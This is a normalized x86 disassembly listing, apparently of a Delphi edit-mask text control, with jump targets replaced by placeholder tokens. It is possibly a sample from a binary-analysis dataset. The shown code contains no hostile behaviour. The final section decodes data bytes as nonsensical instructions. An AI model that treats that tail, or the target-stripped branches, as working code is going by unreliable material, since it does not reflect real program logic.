mov eax [ esi + 0x220 ]
call sub_465f18
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_467cfc
mov ebx eax
dec ebx
sub_467d58
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] cl
mov esi edx
mov ebx eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4675bc
cmp si 0x24
jne r-xdata
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x1
je r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_467604
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
xor edx edx
mov eax ebx
call sub_467604
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
mov ecx [ ebx + 0x228 ]
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_4675e0
mov eax ebx
call sub_467874
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp + 0x8 ]
xor edx edx
mov eax ebx
call sub_4675e0
mov eax ebx
call sub_467874
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x230 ] eax
mov eax [ esp + 0x8 ]
dec eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
mov [ esp + 0x8 ] eax
sub_467e28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_467f34
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467f3b
lea eax [ ebp - 0xc ]
call sub_404094
retn
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4675bc
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jg r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jl r-xdata
cmp si 0x8
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4670cc
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
push eax
lea edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax ebx
call sub_4688e0
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
sub ecx [ edi ]
mov edx [ edi ]
inc edx
mov eax [ ebp - 0xc ]
call sub_4045b4
mov eax [ ebp - 0xc ]
call sub_404554
push eax
push 0x0
push 0xc2
mov eax ebx
call sub_448d84
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
je r-xdata
mov esi [ edi ]
mov edx [ edi ]
mov eax ebx
call sub_467ce0
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4675bc
cmp esi [ edi ]
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4675bc
mov edx [ edi ]
dec edx
mov eax ebx
call sub_467604
mov edx [ edi ]
mov eax ebx
call sub_467cfc
mov [ edi ] eax
mov edx [ edi ]
mov eax ebx
call sub_467604
jmp r-xdata
sub_467f44
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467fc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4673e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43b090
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x22d ] 0x2
jne r-xdata
and [ ebx + 0x22d ] 0xfd
mov eax ebx
call sub_467874
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4670cc
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x238 ]
call sub_4040e8
mov edx esi
mov eax ebx
call sub_43b090
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467fce
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_467fd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_468055
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_43b0cc
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4670cc
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x238 ]
call sub_4040e8
mov eax ebx
call sub_449088
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46805c
lea eax [ ebp - 0xc ]
call sub_404094
retn
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4675bc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_467cfc
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx eax
mov eax ebx
call sub_467604
sub_468064
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x4 ] 0x1b
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4673e4
test al al
je r-xdata
mov eax ebx
call sub_43a910
test al al
je r-xdata
mov [ esi + 0xc ] 0x1
sub_46809c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4673e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4481ac
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov eax ebx
call sub_467874
sub_4680d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_468162
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4670cc
mov eax esi
call sub_4673e4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468169
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax esi
call sub_43a910
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
test al al
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_467604
mov eax esi
mov edx [ eax ]
call [ edx + 0xf4 ]
or [ esi + 0x22d ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_468170
push ebx
add esp 0xfffffff8
mov ebx eax
push 0x0
call MessageBeep
mov eax [ ebx + 0x220 ]
mov [ esp ] eax
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdb4
call sub_403ad0
pop ecx
pop edx
pop ebx
retn
sub_4681ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push edi
mov cl [ ebx + 0x224 ]
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_465ad0
push edi
mov cl 0x20
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_465ad0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4681f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4683ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov eax esi
mov edx ebx
call sub_4040e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_404354
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx 0x1
call sub_465a34
mov ebx eax
test bl 0x1
je r-xdata
mov edi 0x1
mov eax [ esi ]
call sub_404354
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ esi ]
call sub_404354
mov ebx eax
test ebx ebx
jle r-xdata
mov al [ ebp - 0xd ]
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi ]
call sub_404354
mov ecx eax
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
inc edx
mov eax [ esi ]
call sub_4045b4
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
dec ecx
mov eax [ esi ]
mov edx 0x1
call sub_4045b4
mov edx [ ebp - 0x18 ]
mov eax esi
pop ecx
call sub_4043a0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x224 ] 0x20
je r-xdata
mov edi 0x1
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov edi 0x1
inc edi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4683c1
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4040b8
retn
mov eax [ esi ]
call sub_404354
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ esi ]
call sub_404354
mov edx eax
dec edx
mov eax esi
call sub_4046e0
inc edi
dec ebx
jne r-xdata
push esi
mov eax [ esi ]
call sub_404354
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ esi ]
mov edx [ ebp - 0xc ]
call sub_4045b4
jmp r-xdata
inc [ ebp - 0xc ]
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx edi
call sub_4658e0
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
dec eax
sub al 0x2
jae r-xdata
mov edi 0x1
mov eax [ ebp - 0x8 ]
sub eax edi
mov edx [ esi ]
mov al [ edx + eax ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov eax esi
call j_sub_404560#2
mov [ eax + edi - 0x1 ] 0x20
inc edi
dec ebx
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
sub_4683c8
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov bl 0x1
cmp [ esi + 0x220 ] 0x0
je r-xdata
test bl bl
jne r-xdata
xor ebx ebx
mov edx edi
mov eax [ esi + 0x220 ]
call sub_465ebc
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call MessageBeep
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4658e0
mov [ esp ] al
mov al [ ebp ]
mov [ esp + 0x1 ] al
mov edx ebp
mov ecx edi
mov eax esi
call sub_46855c
mov ebx eax
test bl bl
jne r-xdata
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
mov cl [ esp + 0x1 ]
mov edx edi
mov eax esi
call sub_468c3c
mov edi eax
test edi edi
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_465e68
mov edi eax
mov edx edi
mov eax esi
call sub_467604
jmp r-xdata
sub_46847c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_46854a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_465e68
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_404354
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jle r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax - 0x1 ]
call sub_402aa4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax ]
call sub_402aa4
pop edx
cmp dl al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi ]
call sub_4670cc
mov eax [ ebp - 0x4 ]
mov edx ebx
call sub_40c670
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ esi ]
call sub_4670cc
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x1 ]
call sub_40c670
cmp al 0x1
je r-xdata
xor eax eax
jmp r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468551
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
sub_46855c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46880e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_4658e0
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_465a34
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x43
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx - 0x1 ]
call sub_465ab0
mov [ ebx ] al
jmp r-xdata
sub eax 0x4c
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468815
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_4040b8
retn
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x15
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
sub eax 0x23
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40412c
lea eax [ ebp - 0x10 ]
call j_sub_404560#2
mov dl [ ebx ]
mov [ eax ] dl
mov al [ ebx ]
call sub_468464
test al al
je r-xdata
push ebp
mov al [ ebx ]
call sub_46847c
pop ecx
test al al
je r-xdata
sub eax 0x2
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
je r-xdata
push ebp
mov al [ ebx ]
call sub_46847c
pop ecx
test al al
je r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0xd
je r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaA
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub eax 0x9
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40412c
lea eax [ ebp - 0x10 ]
call j_sub_404560#2
mov dl [ ebx ]
mov [ eax ] dl
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x20
je r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
cmp [ ebx ] 0x30
jb r-xdata
sub eax 0x9
je r-xdata
test [ ebp - 0xa ] 0x2
je r-xdata
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x41
je r-xdata
jmp r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_407ff0
mov edx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_40412c
jmp r-xdata
cmp [ ebx ] 0x2b
je r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebx ] 0x39
jbe r-xdata
sub eax 0x8
je r-xdata
test [ ebp - 0xa ] 0x4
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
call sub_407ff0
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_40412c
jmp r-xdata
mov al [ ebx ]
push eax
call IsCharAlphaNumericA
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
cmp [ eax + edx - 0x1 ] 0x61
jne r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_408024
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_40412c
cmp [ ebx ] 0x2d
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
mov [ ebx ] al
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_408024
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_40412c
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_468823
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov [ esp + 0x8 ] 0x1
mov [ esp + 0xc ] 0x1
mov eax [ ebp + 0x220 ]
call sub_404354
mov esi eax
test esi esi
jle r-xdata
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi 0x1
inc [ esp + 0xc ]
jmp r-xdata
sub al 0x2
jne r-xdata
inc edi
dec esi
jne r-xdata
cmp bl 0x4
jne r-xdata
mov eax [ ebp + 0x220 ]
mov edx edi
call sub_4658e0
mov ebx eax
mov eax ebx
dec eax
sub al 0x2
jb r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
mov al [ eax + edx - 0x1 ]
cmp al [ ebp + 0x224 ]
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0xc ]
dec eax
mov edx [ esp + 0x4 ]
mov [ edx ] eax
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0xc ]
cmp [ eax + edx - 0x1 ] 0x20
jne r-xdata
inc [ esp + 0xc ]
mov eax [ ebp + 0x220 ]
cmp [ eax + edi - 0x1 ] 0x43
je r-xdata
sub_4688e0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x1
test eax eax
je r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x8 ]
inc ebx
add eax ebx
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_465ebc
mov esi eax
test esi esi
jl r-xdata
mov eax [ edi + 0x220 ]
call sub_404354
sub eax esi
jl r-xdata
inc eax
xchg esi eax
mov [ ebp - 0x14 ] eax
add al 0xfc
sub al 0x2
jae r-xdata
inc ebx
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call j_sub_404560#2
mov dl [ edi + 0x224 ]
mov [ eax + ebx - 0x1 ] dl
inc ebx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ edi + 0x220 ]
mov edx [ ebp - 0x14 ]
call sub_4658e0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
sub_468978
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_468c28
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468c2f
lea eax [ ebp - 0x34 ]
mov edx 0x8
call sub_4040b8
lea eax [ ebp - 0x10 ]
call sub_404094
retn
mov ebx 0x1
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_40412c
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x220 ]
call sub_465ebc
mov edi eax
test edi edi
jl r-xdata
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_404354
cmp edi eax
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4658e0
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x10 ]
call sub_404354
add eax [ ebp + 0x8 ]
cmp eax [ esi + 0x228 ]
jge r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
mov [ ebp - 0x11 ] al
lea edx [ ebp - 0x11 ]
mov ecx edi
mov eax esi
call sub_46855c
test al al
jne r-xdata
dec eax
sub al 0x2
jae r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_40c670
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404354
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40c670
cmp al 0x2
jne r-xdata
mov al [ ebp - 0x9 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax ebx
cmp eax [ esi + 0x228 ]
jg r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx [ esi + 0x228 ]
sub ecx edi
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_4045b4
mov eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_4045b4
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4043a0
inc edi
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx 0x1
call sub_4045b4
push [ ebp - 0x28 ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
call sub_404354
add eax [ ebp + 0x8 ]
mov edx [ esi + 0x228 ]
sub edx eax
push edx
mov eax [ ebp - 0x10 ]
call sub_404354
mov edx eax
add edx [ ebp + 0x8 ]
inc edx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
pop ecx
call sub_4045b4
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404414
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov dl [ esi + 0x224 ]
call sub_40427c
mov edx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
call sub_40435c
inc ebx
lea eax [ ebp - 0x10 ]
call j_sub_404560#2
mov dl [ ebp - 0x11 ]
mov [ eax + ebx - 0x1 ] dl
mov eax [ rw-data ]
mov dl [ ebp - 0x11 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + ebx - 0x1 ]
cmp al [ ebp - 0x11 ]
jne r-xdata
mov al [ esi + 0x224 ]
mov [ ebp - 0x11 ] al
lea eax [ ebp - 0x10 ]
call j_sub_404560#2
mov dl [ esi + 0x224 ]
mov [ eax + ebx ] dl
mov eax [ ebp - 0x10 ]
call sub_404354
cmp eax ebx
jl r-xdata
add ebx [ ebp + 0x8 ]
dec ebx
mov [ ebp - 0x8 ] ebx
inc ebx
inc ebx
inc edi
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_4045b4
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0x11 ]
call sub_40427c
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_404354
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_4045b4
push [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404414
inc edi
sub_468c3c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov esi eax
or ebp 0xffffffff
jmp r-xdata
mov eax [ esi + 0x220 ]
call sub_404354
cmp edi eax
jl r-xdata
inc edi
mov edx edi
mov eax [ esi + 0x220 ]
call sub_4658e0
mov edx eax
dec edx
sub dl 0x2
jae r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x220 ]
mov dl [ edx + edi - 0x1 ]
cmp al 0x2
jne r-xdata
cmp bl dl
jne r-xdata
mov eax edx
call sub_465ab0
mov edx eax
mov ebp edi
jmp r-xdata
sub_468c98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468cbd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468cc4
retn
sub_468cd4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x8d
inc esi
add [ eax + eax ] cl
add [ eax ] al
adc al 0x72
inc eax
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
xor al 0x33
inc eax
add [ 0x766e4945 ] dl
popad
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x704f6469
jb r-xdata
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
je r-xdata
add [ ebx + ebp * 4 ] cl
inc esi
add [ ebp * 4 - 0x51dbffba ] bh
inc esi
add [ esp + edx * 2 ] cl
dec ecx
outsb
jo r-xdata
add [ eax + ecx * 4 ] ch
inc esi
add [ eax - 0x7f ] dh
inc esi
add al dl
add [ esi ] 0x74
mov al 0x46
add ah bl
mov al 0x46
add [ edx ] cl
add [ ecx ] bl
mov al 0x87
add [ edx ] al
add eax [ eax ]
add eax [ ebx ]
add ebp ecx
jmp edx
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax ] al
test al 0x46
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax + ebp * 4 + 0x43 ] ch
add [ eax + 0x19 ] bl
inc esp
add [ esp + 0x24240044 ] ch
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0xae400044
inc esi
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ eax - 0x58 ] ah
inc esi
add [ ebp + ebp * 4 + 0x43 ] ah
add ah dl
lodsd [ esi ]
inc ebx
add [ edx + 0x62c00044 ] bh
inc esp
add [ eax + 0x61 ] bh
inc esp
add [ eax - 0x52 ] bh
inc ebx
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
